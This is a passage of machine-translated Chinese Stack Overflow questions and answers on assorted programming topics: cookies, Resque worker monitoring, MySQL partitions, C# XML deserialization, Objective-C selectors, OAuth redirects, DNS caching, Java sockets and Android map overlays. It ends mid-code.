> *第三方 cookie 是使用与地址栏上显示的域不同的域设置的 cookie*

如果我没记错的话，这使得 99.99% 的所有 JSONP 设置的 cookie 都是第三方 cookie。在我的情况下，地址栏上显示的地址是*file://*，这使我的 cookie 成为第三方的。

一旦我启用了第三方 cookie，它就起作用了。

附带说明一下，Chrome 默认情况下不支持 file:// 页面上的 cookie，并且不会对此发出警告或通知。它引起了一些麻烦。有关详细信息，请参见[此处](http://code.google.com/p/chromium/issues/detail?id=535)和[此处](http://code.google.com/p/chromium/issues/detail?id=95644)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-26T01:32:09.303

是的。动态图像请求和 CSS 请求等也可以。如果是 XHR 请求，您甚至可以读取响应标头（Set-Cookie 等）。

现在如何忽略 cookie？你怎么知道？

# ruby-on-rails - 找出 resque 作业是否仍在运行，如果卡住则将其终止

> ID：10757758
> 
> 赞同：2
> 
> 时间：2012-05-25T16:02:12.360
> 
> 标签：ruby-on-rails, ruby, caching, redis, resque

我有一个使用 resque 来运行一些长时间运行的作业的应用程序。有时需要 8 小时或更长时间才能完成。

在作业失败的情况下，有没有办法监控 resque 本身以查看作业是否正在运行？我知道我可以在数据库表（或 redis 本身）中更新作业的状态，但我想知道作业是否仍在运行，以便在必要时将其终止。

我需要做的具体事情是：

*   确定作业是否仍在运行
*   确定作业是否已停止
*   杀死卡住的工作

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-25T16:22:10.560

Resque [github 存储库](https://github.com/resque/resque)有这个秘密的宝石，一个[上帝](http://godrb.com/)的任务可以做到这一点：观察你的任务并杀死过时的任务。

[https://github.com/resque/resque/blob/master/examples/god/stale.god](https://github.com/resque/resque/blob/master/examples/god/stale.god)

```
# This will ride alongside god and kill any rogue stale worker
# processes. Their sacrifice is for the greater good.

WORKER_TIMEOUT = 60 * 10 # 10 minutes

Thread.new do
  loop do
    begin
      `ps -e -o pid,command | grep [r]esque`.split("\n").each do |line|
        parts   = line.split(' ')
        next if parts[-2] != "at"
        started = parts[-1].to_i
        elapsed = Time.now - Time.at(started)

        if elapsed >= WORKER_TIMEOUT
          ::Process.kill('USR1', parts[0].to_i)
        end
      end
    rescue
      # don't die because of stupid exceptions
      nil
    end

    sleep 30
  end
end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-06T05:34:25.773

上帝的解决方案最终会杀死可能根本没有卡住或坏的工人。我也开始通过不同的方法来解决这个问题。你做任何你想做的事——当出现任何resque问题时注册一个处理程序（可以杀死、发送电子邮件、发送寻呼机警报等）。

如果在某个时间范围内没有处理作业（因为 resque 被卡住，队列有疯狂的积压，或者 resque 根本没有运行），处理程序将被调用。随意戳阅读自述文件以获取更多详细信息。

[https://github.com/shaiguitar/resque_stuck_queue#readme](https://github.com/shaiguitar/resque_stuck_queue#readme)

# mysql - 在 MySql 中索引表分区

> ID：10757759
> 
> 赞同：0
> 
> 时间：2012-05-25T16:02:22.783
> 
> 标签：mysql, indexing, partitioning

在我的项目中，我有一个大约 20 列的表格。我们在“状态”列上有分区表。为了简单起见，假设状态“错误”和“成功”有两个可能的值。因此，我们有两个分区，即表的 p1 和 p2。我们想要的是在每个分区上有不同的索引。例如，分区 p1 需要在 column1 和 column2 上有索引，而分区 p2 需要在第 4 列和第 5 列上有索引。

是否可以在 MySql 中的表的单个分区上应用索引而不是在表级别应用索引？我正在使用 Mysql 5.5。我不想在表级别应用索引的原因是它会使所有插入变慢。在此表中插入将对用户的响应时间产生影响。但是更新是通过作业发生的，因此响应时间不是问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T19:11:37.390

在 MySQL 中，索引工作在表级别，而不是分区级别。

从您的问题来看，您似乎需要准备好进行很多非常快速的查询，这些查询看起来像

```
 SELECT something WHERE status='ERROR' and col1='val' and col2='val' 
```

和

```
 SELECT something WHERE status='SUCCESS' and col4='val' and col5='val' 
```

您是否会执行更改`status`列值的更新？如果没有，您可以将您的 SUCCESS 和 ERROR 项插入不同的表中，每个表都有适当的索引。如果您需要一起检索它们，您可以使用 VIEW 来执行此操作。

# c# - 如何从 XML 反序列化未知类型？

> ID：10757771
> 
> 赞同：2
> 
> 时间：2012-05-25T16:03:11.460
> 
> 标签：c#, xml, deserialization

考虑以下过度简化的 XML 块：

```
<ElementA>
   <AttributeValue DataType="http://www.w3.org/2001/XMLSchema#integer">5
   </AttributeValue>
</ElementA> 
```

具体来说，从 DataType 属性查看 AttributeValue 元素，我知道我的值是整数类型（尽管它可能是双精度、字符串、日期时间......任何来自 w3 标准的已建立数据类型）。我想将此 xml 反序列化为具有强类型值的 .NET 类。我首先想到的是创建一个通用的 AttributeValue 类：

```
public class AttributeValue<T>
{
    public T Value {get; set;}
} 
```

但当然这不起作用有几个原因 - 最大的一个原因是我必须在父类中声明类型，因为 T 没有定义，所以无法编译：

```
public class ElementA
{
    public AttributeValue<T> {get; set; }  // Naturally, this will not work because T
}                                          // is not defined. 
```

另外，我可能必须在我的类上实现 IXmlSerializable 来处理自定义序列化。

有没有更好的方法来解决这个问题？我知道我可以在我的代码中序列化 DataType 属性并将值存储为字符串，然后稍后进行转换，但是在我的业务对象中实际具有正确的类型以供以后处理会很有帮助

谢谢你的帮助！

杰森

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T16:14:57.473

好吧，我知道这不是您问题的确切答案，但是您可以在 .Net 4 中使用动态来实现解决方案。这是一个示例：

```
public class DynamicElement : DynamicObject
{
    public Dictionary<string, object> Attributes
    {
        get { return lst; }
    }

    private Dictionary<string, object> lst;

    public DynamicElement()
    {
        lst = new Dictionary<string, object>(StringComparer.InvariantCultureIgnoreCase);
    }

    public bool Present(string name)
    {
        if (lst == null) return false;
        if (!lst.ContainsKey(name)) return false;

        return true;
    }

    public override bool TryGetMember(GetMemberBinder binder, out object result)
    {
        var name = binder.Name;
        result = null;

        if (lst == null) return false;
        if (!lst.ContainsKey(name)) return false;

        result = lst[name];
        return true;
    }
    public override bool TrySetMember(SetMemberBinder binder, object value)
    {
        var name = binder.Name;

        if (lst == null) return false;

        if (!lst.ContainsKey(name))
            lst.Add(name, value);
        else
            lst[name] = value;

        return true;
    }
} 
```

然后使用它，它类似于：

```
dynamic d = new DynamicElement();
d.AttributeValue = Convert.ToInt32(xmlElement.Value);
d.Done = true; //just another example. 
```

之后：

```
public void something(DynamicElement de)
{
    dynamic d = de;
    if(d.Done) //remember, defined this above.. just an example.
    {
        int someValue = d.AttributeValue;
    }
} 
```

缺点是没有智能感知。这一切都在运行时解决。`d.Present("AttributeName");`如果没有完全编译，您还可以使用“抱歉”检查值是否存在。我用记事本写的：）

**编辑：**

实现序列化也不难——因为您所要做的就是遍历属性字典。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-29T14:28:05.437

感谢您的回答@caesay，我确实实现了它，但我不确定我需要那种类型的功能（能够向字典添加多个属性）。虽然我在代码中确实需要使用发电机，但我尽量避免使用它。

相反，我实现了以下结构以在我的父类中保留泛型类型：

```
public class AttributeValueElement : XACMLElement
{

    public AttributeValueElement()
        : base(XacmlSchema.Context)
    {

    }

    [XmlAttribute]
    public string DataType { get; set; }

    [XmlText]
    public string Value 
    { 
        get { return DataValue.GetValue().ToString(); }
        set
        {
            DataValue = AttributeValueFactory.Create(DataType, value);   
        }
    }

    public AttributeValue DataValue { get; set; }        
}

public abstract class AttributeValue
{
    public AttributeValue()
    {

    }
    public abstract object GetValue();
}

public class AttributeValue<T> : AttributeValue
{
    public T Value { get; set; }
    public override object GetValue()
    {
        return Value;
    }
} 
```

以及相应的工厂类来创建属性值：

```
public static AttributeValue Create(string xacmlDataType, string value)
    {

        AttributeValue _attributeValue = null;

        switch (xacmlDataType)
        {
            case "http://www.w3.org/2001/XMLSchema#string":
            case "http://www.w3.org/2001/XMLSchema#x500Name":
            case "http://www.w3.org/2001/XMLSchema#ipAddress":
            case "http://www.w3.org/2001/XMLSchema#dnsName":
            case "http://www.w3.org/2001/XMLSchema#xPathExpression":
                _attributeValue = new AttributeValue<string> { Value = value };
                break;
            case "http://www.w3.org/2001/XMLSchema#boolean":
                _attributeValue = new AttributeValue<bool> {Value = XmlConvert.ToBoolean(value) };
                break;
            case "http://www.w3.org/2001/XMLSchema#integer":
                _attributeValue = new AttributeValue<int> { Value = XmlConvert.ToInt32(value) };
                break;
            case "http://www.w3.org/2001/XMLSchema#double":
                _attributeValue = new AttributeValue<double> { Value = XmlConvert.ToDouble(value) };
                break;
            case "http://www.w3.org/2001/XMLSchema#time":
            case "http://www.w3.org/2001/XMLSchema#date":
            case "http://www.w3.org/2001/XMLSchema#dateTime":
                _attributeValue = new AttributeValue<DateTime> { Value = XmlConvert.ToDateTime(value, XmlDateTimeSerializationMode.Utc) };
                break;
            case "http://www.w3.org/2001/XMLSchema#anyURI":
                _attributeValue = new AttributeValue<Uri> { Value = new Uri(value) };
                break;
            case "http://www.w3.org/2001/XMLSchema#hexInteger":
                _attributeValue = new AttributeValue<byte[]> { Value = Encoding.ASCII.GetBytes(value) };
                break;          
            case "http://www.w3.org/2001/XMLSchema#dayTimeDuration":
            case "http://www.w3.org/2001/XMLSchema#yearMonthDuration":
                _attributeValue = new AttributeValue<TimeSpan> { Value = XmlConvert.ToTimeSpan(value) };
                break;                
            default:
                throw new NotImplementedException("Data type '" + xacmlDataType + "' is not a supported type.");
        }           

        return _attributeValue;
    } 
```

我讨厌在 stackoverflow 上回答我自己的问题，但有时它会发生。

谢谢你们的回应！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T16:33:52.470

你想做的事情真的做不到。您有一个动态结构（其数据字段可以是任意类型的 XML），并且您希望在您的类中有一个**强类型**定义。如果它是强类型的，你应该知道编译类型时的类型，而你不知道。@caesay 的建议是一个很好的建议，或者简单地表示数据`Object`也可以，但是如果您在编译时不知道信息，则无法进行编译器检查（即强类型）。

# objective-c - @selector 指令有什么用？为什么不简单地使用方法的名称？

> ID：10757778
> 
> 赞同：8
> 
> 时间：2012-05-25T16:03:22.597
> 
> 标签：objective-c, selector

我已经阅读了很多文章以了解为什么必须使用`@selector()`来引用方法，但我认为我并不满意。例如，当我们为按钮指定操作时，我们必须编写：

```
[btn addTarget:self action:@selector(myMethod)]; 
```

为什么不简单：

```
[btn addTarget:self action:myMethod]; 
```

请解释需要和原因，以及没有它会发生什么。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-25T16:41:34.480

> 为了理解 @selector 关键字，我阅读了很多文章，但我仍然不太了解它的用途。我只想问为什么我们有@selector。

这一切都与解析 C 语言有关。

就其本身而言，在像`[obj performSelector:someRandomSelector]'`编译器这样的表达式中，将`someRandomSelector`bit 视为“扩展任何`someRandomSelector`内容——评估表达式、处理#defines、为以后的链接放置符号等等……——而无论该扩展产生什么，最好是 SEL .

因此，如果您要编写`[obj performSelector:action]'`编译器，编译器将无法知道`action`作为包含潜在易失选择器的变量与`action`作为 on 方法的实际名称之间的区别`obj`。

`@selector()`通过在语言中创建一个始终评估为恒定 SEL 结果的句法添加来解决此问题。

从历史上看，Objective-C 最初是作为 C 预处理器的直接扩展实现的。所有各种`@...`前缀添加使该实现变得更加容易，因为基本上任何以 an`@`为前缀的东西都是Objective-Cism。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T16:26:26.367

这是语言设计的问题。您需要说“这是一个选择器”，这就是他们用来分隔源文件中描述您正在谈论的选择器及其周围代码的文本的语法。这需要某种引号或括号。`@selector(...)`只是他们使用的语法。

如果您有一个包含 的选择器，`:`例如称为 ，该`thingWithX:y:z:`怎么办？你不能有`[btn addTarget:self action:thingWithX:y:z:]`，因为冒号会混淆编译器。您必须`[btn addTarget:self action:@selector(thingWithX:y:z:)]`这样做才能将 btn`action:`的选择器和它引用的选择器分开``thingWithX:y:z:`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T16:19:25.337

Here is the docs on selectors:

[http://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/ObjectiveC/Chapters/ocSelectors.html#//apple_ref/doc/uid/TP30001163-CH23-SW1](http://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/ObjectiveC/Chapters/ocSelectors.html#//apple_ref/doc/uid/TP30001163-CH23-SW1)

I think you will understand after reading it.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-06-21T20:03:44.390

如果 myMethod 是 SELECTOR 的实例，您的示例可以工作

```
[btn addTarget:self action:myMethod]; 
```

对于字符串，您可以使用

```
[btn addTarget:self action:NSSelectorFromString(@"myMethod")]; 
```

在这里解释[https://developer.apple.com/library/mac/documentation/General/Conceptual/DevPedia-CocoaCore/Selector.html](https://developer.apple.com/library/mac/documentation/General/Conceptual/DevPedia-CocoaCore/Selector.html)

这是一个通用 actionLinker 函数的示例[如何以编程方式为 UIButton 设置回调？](https://stackoverflow.com/questions/11174858/how-to-programmatically-setup-a-callbacks-for-a-uibutton)

```
- (void)setRunButton:(UIButton *)objectName mySelector:(NSString *)action myControlEvent:(UIControlEvents)controlEvent {

   [objectName addTarget:self action:NSSelectorFromString(action) forControlEvents:controlEvent];

} 
```

如果您想将自己的示例与 myMethod 一起用作选择器的实例，则以下代码更适用

```
- (void)setRunButton:(UIButton *)objectName mySelector:(SEL)action myControlEvent:(UIControlEvents)controlEvent {

   [objectName addTarget:self action:action forControlEvents:controlEvent];

} 
```

# oauth-2.0 - 带有查询字符串的 Google oauth 重定向

> ID：10757784
> 
> 赞同：2
> 
> 时间：2012-05-25T16:03:48.963
> 
> 标签：oauth-2.0

我正在尝试使用 Google 的 oauth2.0 系统来访问日历 API。

有没有办法将查询字符串添加到 Google 的 oauth2.0 身份验证中？到目前为止，如果我想使用查询字符串进行重定向，我必须执行以下操作

*   www.example.com/?query_string=1
*   www.example.com/?query_string=2
*   www.example.com/?query_string=3
*   www.example.com/?query_string=4
*   剪断
*   www.example.com/?query_string=9999999999

这既不可行，也不是良好实践的标志。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-04-22T08:22:09.553

您可以`state`在访问请求中的查询字符串中设置，该值将在重定向的 url 中复制。

例如：

访问请求 uri（当用户点击*使用 google 登录时*）

```
https://accounts.google.com/o/oauth2/v2/auth?
redirect_uri=http://your_uri.com/callback&
state=<state>&
... 
```

重定向的 uri（在用户同意后）

```
http://your_uri.com/callback#
state=<state>
... 
```

# asp.net - 如何在asp.net堆积柱状图中将数据与系列绑定

> ID：10757785
> 
> 赞同：0
> 
> 时间：2012-05-25T16:03:51.737
> 
> 标签：asp.net, mschart

当我想将动态数据与系列绑定时，发生错误，您无法将数据与系列绑定......我怎么做？？？

```
`enter code here`
 <asp:Chart ID="Chart4" runat="server">
    <Series>
        <asp:Series Name="Series1" Label='<%# Eval("coulmname") %>'>
        </asp:Series>
    </Series>
    <ChartAreas>
        <asp:ChartArea Name="ChartArea1">
        </asp:ChartArea>
    </ChartAreas>
</asp:Chart> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-02T15:09:48.320

您可以将图表绑定到 DataTable：

```
chart1.DataSource = dataTable1;
chart1.DataBind(); 
```

然后在您的标记中使用 YValueMembers 和 XValueMember 属性指定您的数据成员：

```
<asp:Chart ID="chart1" runat="server">
  <Series>
    <asp:Series Name="series1" YValueMembers="coulmname1" XValueMember="coulmname2" IsValueShownAsLabel="true" ></asp:Series>
  </Series>
  <ChartAreas>
    <asp:ChartArea Name="ChartArea1"></asp:ChartArea>
  </ChartAreas>
</asp:Chart> 
```

# wcf - 如何在 Windows Server 2008 上禁用 DNS 缓存

> ID：10757791
> 
> 赞同：1
> 
> 时间：2012-05-25T16:04:03.123
> 
> 标签：wcf, amazon-web-services, dns, windows-server-2008, windows-server-2008-r2

在 Windows Server 2008 环境中运行测试应用程序时，我遇到了 DNS 缓存问题。测试应用程序模拟数百个用户连接到 Web 服务。Web 服务托管在 Amazons Web Services 后面，实际上是一个负载均衡器，背后有许多 Amazon EC2 实例。负载均衡器和 EC2 实例在正常操作下工作正常，因为正常客户端连接分布均匀。但是，当我运行测试应用程序时，所有连接都命中单个 EC2 实例。我相信这可能归结于托管测试应用程序缓存 DNS 查找的 Windows 环境。

如何禁用 DNS 缓存？我认为只需停止 DNS 客户端服务会很容易（如此处所述：http: [//www.tipsandtutorials.net/how-to-turn-off-dns-caching-under-microsoft-windows.html](http://www.tipsandtutorials.net/how-to-turn-off-dns-caching-under-microsoft-windows.html)）但是这个没有改变任何东西。是否还有其他必须做的事情来禁用缓存？

还有什么我可以看的可能导致这些问题的东西吗？

**编辑：**是否有可能在 WCF 服务中使用另一个级别的 DNS 缓存？

TIA

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T15:47:15.590

我认为您的问题是您的负载均衡器正试图将所有流量从同一主机发送到同一服务器……这是“设计使然”……（又名：“粘性会话”）

您需要明确告诉您的负载均衡器您要禁用粘性会话并启用“循环”...（具体术语将根据您的负载均衡器技术而有所不同）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-30T07:53:27.653

基于[this other question](https://stackoverflow.com/a/7277702/1077279)，我认为您需要

```
ServicePointManager.DnsRefreshTimeout = 0; 
```

和

```
request.KeepAlive = false; 
```

您可以`ServicePointManager`通过 web.config 进行设置。请参阅[MSDN 文档](http://msdn.microsoft.com/en-us/library/zsk61s76.aspx)。

此外，还有另一个类似的设置`enableDnsRoundRobin`看起来也可能对您有所帮助。

# java - 无法从套接字的 InputStream 获取数据

> ID：10757792
> 
> 赞同：1
> 
> 时间：2012-05-25T16:04:04.907
> 
> 标签：java, sockets

尝试运行回显服务器时无法读取/写入数据到套接字。没有抛出异常，也没有对控制台输入的响应。代码中有什么不正确的地方？

```
public class Server {

    static ServerSocket server;

    public static void main(String[] args) throws IOException  {
        String hostname = "127.0.0.1";

        try{
            server = new ServerSocket(8888); 
          } catch (IOException e) {
            System.out.println("Could not listen on port 8888");
            System.exit(-1);
          }

        Socket theSocket = null;
        try {
            theSocket = new Socket(hostname, 8888);

            BufferedReader networkIn = new BufferedReader(new InputStreamReader(theSocket.getInputStream()));
            BufferedReader userIn = new BufferedReader(new InputStreamReader(System.in));
            PrintWriter out = new PrintWriter(theSocket.getOutputStream(), true);
            System.out.println("Connected to echo server");

            while (true) {
              String theLine = userIn.readLine();
              if (theLine.equals("."))
                break;
              out.println(theLine);
              out.flush();
              System.out.println("networkIn: "+networkIn.readLine());
            }
            networkIn.close();
            out.close();
            System.out.println("out.close();");
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-25T16:13:31.853

您创建了两个不相关的套接字，一个用于接受连接，一个用于连接到 (hostname,8888)。您需要调用`accept()`服务器套接字才能真正连接客户端。请参阅[教程](http://docs.oracle.com/javase/tutorial/networking/sockets/clientServer.html)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T16:16:37.050

首先添加`Socket client = server.accept();`. 然后你会看到你需要如何重组你的程序的其余部分。

# netbeans - Netbeans 关于事件注入的警告

> ID：10757793
> 
> 赞同：3
> 
> 时间：2012-05-25T16:04:06.417
> 
> 标签：netbeans, warnings, observer-pattern, cdi

我在我的 LanguageOfSystem bean 中使用 CDI Observer 模式。

```
@Named(value = "languageOfSystem")
@SessionScoped
public class LanguageOfSystem implements Serializable {

   @Inject private JsfUtils eeJsfUtils;
   @Inject private Event<LangEvent> langEvent;
   private LangEvent docLangEvent = new LangEvent(); 
```

其中 LangEvent 很简单：

```
package jav;

import java.util.Locale;

public class LangEvent {
   private Locale locale;

   public Locale getLocale() {
      return locale;
   }

   public void setLocale(Locale locale) {
      this.locale = locale;
   }
} 
```

一切正常，但 NetBeans 给了我一个警告： ![在此处输入图像描述](../Images/c05a13f8984376e078c136fbca0a6b40.png)

```
Unstatisfied dependency: no bean matches the injection point. 
```

我应该检查或改变一些东西吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-25T18:54:08.787

不用担心，代码很好。它看起来像[这个](http://netbeans.org/bugzilla/show_bug.cgi?id=201825#c6)NetBeans 错误。

顺便提一句，

```
@Named(value = "languageOfSystem")
public class LanguageOfSystem 
```

已经是默认值了，可以写成：

```
@Named
public class LanguageOfSystem 
```

# mysql - MySQL用不同的列查找查询两个表

> ID：10757794
> 
> 赞同：-1
> 
> 时间：2012-05-25T16:04:09.463
> 
> 标签：mysql

如何使这种语法有效：

```
SELECT * 
FROM
  uploads,
  audienceuploadassociation 
WHERE 
  uploads.member_id = '1'
  AND uploads.member_school_id='1' 
  AND subject = 'Maths' 
  AND uploads.upload_id = audienceuploadassociation.upload_id 
  AND topic = 'Integers' 
  AND year IN(7, 8, 9) 
  AND audienceuploadassociation.audiencename LIKE (Parents, Teachers, Community) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-25T16:07:12.143

你的`LIKE`条款有问题。我怀疑您打算改用[一个`IN()`子句](http://dev.mysql.com/doc/refman/5.5/en/comparison-operators.html#function_in)：

```
AND audienceuploadassociation.audiencename IN ('Parents', 'Teachers', 'Community') 
```

如果您尝试将部分字符串与 匹配`LIKE`，则需要将`OR`它们放在一个`()`组中，如下所示：

```
AND (
  audienceuploadassociation.audiencename LIKE 'Parents%'
  OR audienceuploadassociation.audiencename LIKE 'Teachers%'
  OR audienceuploadassociation.audiencename LIKE 'Community%'
) 
```

另请注意，您使用的隐式连接语法（逗号分隔的表）已被弃用，取而代之的是显式的`JOIN`.

```
SELECT
  uploads.*,
  audienceuploadassociation.*
FROM
  /* Explicit JOIN  with ON clause */
  uploads
  JOIN audienceuploadassociation ON uploads.upload_id = audienceuploadassociation.upload_id 
WHERE 
  uploads.member_id = '1'
  AND uploads.member_school_id='1' 
  AND subject = 'Maths' 
  AND topic = 'Integers' 
  AND year IN(7, 8, 9) 
  AND audienceuploadassociation.audiencename IN ('Parents', 'Teachers', 'Community') 
```

最后，我建议明确命名您想要的列而不是这样做`SELECT *`，因此您可以按确定的顺序获取它们，并防止稍后在此查询中添加您不需要的其他列：

```
SELECT 
  uploads.upload_id,
  uploads.other_column,
  uploads.topic,
  audienceuploadassociation.audiencename,
  ...
  ... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T16:07:39.100

这行得通吗？

```
SELECT * 
FROM
  uploads,
  audienceuploadassociation 
WHERE 
  uploads.member_id = '1'
  AND uploads.member_school_id='1' 
  AND subject = 'Maths' 
  AND uploads.upload_id = audienceuploadassociation.upload_id 
  AND topic = 'Integers' 
  AND year IN(7, 8, 9) 
  AND audienceuploadassociation.audiencename IN ('Parents', 'Teachers', 'Community'); 
```

# matlab - 灰度图像中的 MATLAB 像素值

> ID：10757802
> 
> 赞同：3
> 
> 时间：2012-05-25T16:04:37.060
> 
> 标签：matlab, image-processing

比如说，我有一个 RGB 图像`rgb`和一个空间坐标列表`coords`。我想提取空间坐标处的像素值，例如`[x1 y1]`、`[x2 y2]`和`[x3 y3]`。对于 RGB 图像，我可以这样做：

```
rgb = imread('sample.jpg')
coords = [x1 y1; x2 y2; x3 y3];
pixelData = impixel(rgb, coords(:,1), coords(:,2)); 
```

它返回指定图像像素的红色、绿色和蓝色值。

`impixel`仅适用于彩色 (RGB) 图像。但我想从灰度图像中提取像素值`I`。`for`我可以使用如下循环来做到这一点

```
for i = 1:size(coords,1)
    pixelData(i,:) = I(coords(i,2), coords(i,1));
end 
```

我想避免使用`for`循环。还有另一种方法可以做到这一点吗？

`imstats = regionprops(mask, I,'PixelValues');`也可以，但我首先需要一张图片`mask`。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-25T16:10:38.633

使用[`sub2ind`](http://www.mathworks.co.uk/help/techdoc/ref/sub2ind.html).

```
pixelData = I(sub2ind(size(I), coords(:,2), coords(:,1))); 
```

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2014-09-26T06:24:02.150

```
void Image::createImage(int width_x, int height_y)
{
   pixelData = new Color* [width];  // array of Pixel*

   for (int x = 0; x < width; x++) 
   {
       pixelData[x] = new Color [height];  // this is 2nd dimension of pixelData    
   }
} 
```

# model-view-controller - 服务条款、隐私、帮助、关于操作应属于哪个控制器？

> ID：10757803
> 
> 赞同：0
> 
> 时间：2012-05-25T16:04:38.947
> 
> 标签：model-view-controller

使用 MVC 时，服务条款、隐私、帮助、关于操作应该属于哪个控制器？我应该将它们全部放在 IndexController 中还是应该将它们中的每一个都放在自己的控制器中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-13T18:21:06.050

嗯...没有提到语言。只有名称`indexController`表明您正在谈论基于 Web 的应用程序。另外我会假设您使用的是 Model2 MVC 模式。

好的，**简短的回答：**这取决于。

让我们假设这是一个非常简单的案例 .. ，因为它取决于：

*   .. 内容的存储方式和位置
*   ..它是否是一个多语言系统（或预计会在某个时候变成这样）
*   .. 提到的页面中的交互功能数量（如果有的话）

您的应用程序应该已经有一个控制器，它负责与文档的交互（例如打开的文章）。在这个控制器中，您添加一个方法，该方法从请求对象中读取页面名称，并告诉*模型层*：“我需要这个”。

在视图实例中，您从模型层请求打开文档的内容（这是您准备的“关于”或“规则”文本）。将其绑定到标准模板并渲染它。

# rest - LinkedIn API - 如果用户连接数超过 500，如何获取？

> ID：10757806
> 
> 赞同：1
> 
> 时间：2012-05-25T16:04:56.370
> 
> 标签：rest, linkedin

我能够[让这个网址](https://stackoverflow.com/questions/10745255/linkedin-api-how-to-query-for-the-total-number-of-connections)与他们的 api 一起使用：/people/id=123:(num-connections-total)

它返回连接数，但如果连接数超过 500，它只返回 500。有没有办法让它返回实际的确切数字？

我正在使用此文档页面：

[https://developer.linkedin.com/documents/profile-api](https://developer.linkedin.com/documents/profile-api)

此页面还有更多关于可能的字段：

[https://developer.linkedin.com/documents/profile-fields#profile](https://developer.linkedin.com/documents/profile-fields#profile)

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T17:42:15.267

如果您正在为查看用户检索连接，那么是的，您将使用`total`从调用返回的集合中的属性中的值：

`http://api.linkedin.com/v1/people/id=123:(connections)`

其中 123 是查看成员的 ID。返回值如下所示：

```
<?xml version="1.0" encoding="UTF-8"?>
<person>
  <connections total="XXX" count="YYY" start="0">
    <person>
    ...
    </person>
  </connections>
</person> 
```

如果您尝试为查看用户的连接或其他未连接的用户提取连接计数，那么不，没有办法，[因为连接的连接不能通过 API 获得](https://developer.linkedin.com/comment/14498#comment-14498)。您也可以在 LinkedIn.com 上看到此行为，其中超过 500 的成员仅显示为拥有 500 多个连接。

# android - 如何从 mapOverlay 调用 populate()

> ID：10757811
> 
> 赞同：0
> 
> 时间：2012-05-25T16:05:13.157
> 
> 标签：android, google-maps

我正在将 GeoPoints 从路线转换为叠加层，并在叠加层列表上插入地图（使用 mapView.getOverlays()）。

在第一次执行时，一切正常，但之后，地图不显示路线覆盖。经过研究，我记得我必须调用 populate() 来更新地图叠加层，但我不知道如何在 ItemizedOverlay 类之外执行此操作。

有人可以帮助我吗？

在此先感谢，丹尼尔。

编辑：：

获取路线并将折线解析为 GeoPoints 的方法

```
public void drawRoute(Location from, double toLat, double toLon) {
    String url = RoadProvider.getUrl(from.getLatitude(), from.getLongitude(), toLat, toLon);
    Log.i("rotaUrl", url);

    JSONGet routeHttpObj = new JSONGet(mContext, url) {
        @SuppressWarnings("unchecked")
        @Override
        protected void jsonHandler(JSONObject routeJsonObj) {
            Log.i("Rota", "Rota recebida...");

            try {
                // Qual o status da requisição da rota?
                String status = routeJsonObj.getString("status").toString();

                // O webservice conseguiu traçar uma rota?
                if (status.equalsIgnoreCase("OK")) {
                    Log.i("Rota", "Ok");

                    Log.i("overlay", mapOverlays.toString());
                    Log.i("overlay", mapOverlays.size()+"");

                    // Remove a rota, caso exista
                    if (mapOverlays.size() == 3) {
                        mapOverlays.remove(2);
                    }

                    // Reseta o mapa
                    itemizedOverlay.populateNow();
                    mapView.invalidate();

                    Log.i("overlay", mapOverlays.size()+"");

                    // Extração da polyline codificada
                    String polyline = routeJsonObj.getJSONArray("routes").getJSONObject(0).getJSONObject("overview_polyline").getString("points");

                    // Decodificação da polyline para um array de GeoPoints
                    ArrayList<GeoPoint> route = RoadProvider.decodePolyline(polyline);

                    // Instanciamento do objeto da rota
                    RoadOverlay routeOverlay = new RoadOverlay(route);

                    // Pega a lista de overlays e adiciona a rota ao mapview
                    mapOverlays.add(routeOverlay);

                    // Reseta o mapa
                    itemizedOverlay.populateNow();
                    mapView.invalidate();

                    Log.i("overlay", mapOverlays.size()+"");
                    Log.i("overlay", mapOverlays.toString());

                    // Pega os passos da rota
                    /*JSONArray routeSteps = routeJsonObj.getJSONArray("routes").getJSONObject(0).getJSONObject("legs").getJSONArray("steps");

                    // Percorre os passos da rota e insere nos vetores, para guiar o motorista
                    for (int i=0; i<routeSteps.length(); i++) {
                        // O objeto do passo no indice i
                        JSONObject stepObj = routeSteps.getJSONObject(i);

                        // Cria o array dos pontos
                        GeoPoint[] arrPoints = new GeoPoint[2];

                        // Insere a latitude e longitude no array
                        //arrPoints[0] = stepObj.getJSONObject(name)

                        // Insere o array na lista
                        routePoints.add(arrPoints);
                        // routeInstructions
                    }*/

                    // Copia os pontos para referencia futura
                    routePoints = (ArrayList<GeoPoint>) route.clone();
                } else {
                    // Qual o erro?
                    if (status.equalsIgnoreCase("NOT_FOUND")) {

                    } else if (status.equalsIgnoreCase("ZERO_RESULTS")) {

                    } else if (status.equalsIgnoreCase("MAX_WAYPOINTS_EXCEEDED")) {

                    } else if (status.equalsIgnoreCase("INVALID_REQUEST")) {

                    } else if (status.equalsIgnoreCase("OVER_QUERY_LIMIT") || status.equalsIgnoreCase("REQUEST_DENIED")) {

                    } else {

                    }
                }
            } catch (JSONException e) {
